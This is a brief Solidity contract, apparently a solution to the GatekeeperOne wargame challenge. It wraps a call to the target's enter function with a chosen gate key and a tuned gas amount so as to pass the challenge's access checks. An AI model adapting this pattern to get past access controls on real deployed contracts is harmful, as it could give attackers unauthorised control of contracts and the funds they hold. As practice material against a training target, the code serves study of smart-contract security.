pragma solidity ^0.6.0;

import './GatekeeperOne.sol';
contract GatekeeperOneAttack{
    GatekeeperOne private victim;
    address private owner;
    constructor(GatekeeperOne _victim) public {
        victim = _victim;
        owner = msg.sender;
    }
    function exploit(bytes8 gateKey,uint _gas) external {
        victim.enter.gas(_gas)(gateKey);
    }
}